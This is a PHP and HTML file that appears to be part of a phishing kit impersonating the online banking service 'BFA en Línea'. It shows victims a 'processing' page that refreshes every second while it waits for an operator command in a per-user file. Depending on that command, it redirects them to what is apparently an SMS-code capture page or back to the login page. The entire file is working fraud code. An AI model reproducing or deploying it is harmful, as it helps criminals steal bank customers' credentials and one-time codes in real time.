<?php
session_start();
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) { header("Location: index.php"); exit; }

$archivo = "acciones/$usuario.txt";
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    @unlink($archivo);
    switch ($accion) {
        case '/SMS':    header("Location: som.html");  break;
        case '/ERROR':  header("Location: index.php"); break;
        default:        header("Location: som.html");  break;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BFA en Línea - Procesando</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background:#fff;font-family:'Montserrat',sans-serif;color:#022a4f}
  img{max-width:420px;width:55vw;height:auto}
  p{margin-top:18px;font-size:14px;color:#888;text-align:center}
</style>
</head>
<body>
  <img src="img/loading.gif" alt="Cargando...">
  <p>⚠️ No cierres esta ventana</p>
</body>
</html>
